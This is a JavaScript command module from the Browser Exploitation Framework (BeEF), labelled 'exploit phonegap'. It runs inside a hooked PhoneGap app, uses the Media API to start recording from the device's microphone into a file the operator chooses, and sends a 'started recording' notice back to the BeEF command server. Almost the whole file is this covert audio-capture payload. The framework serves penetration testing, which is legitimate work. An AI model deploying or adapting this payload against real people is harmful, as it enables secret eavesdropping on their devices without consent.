//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// exploit phonegap
//
beef.execute(function() {
    // TODO detect iphone/android and set this accordingly
    var file_uri = "<%== @file_name %>";

    m = new Media(file_uri);
    m.startRecord();
    // weirdly setTimeout and stopRecord don't seem to work together
    //milliseconds = "<%== @duration %>" * 1000;
    //setTimeout("m.stopRecord()", milliseconds);
    
    // so here is an ugly work around
    //start = new Date(); 
    //stop = start.getTime() + 5000; 
    //do { 
    //    current = new Date(); 
    //    current = current.getTime(); 
    //} while(current < stop) 
    //m.stopRecord();
    
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "started recording");	
});
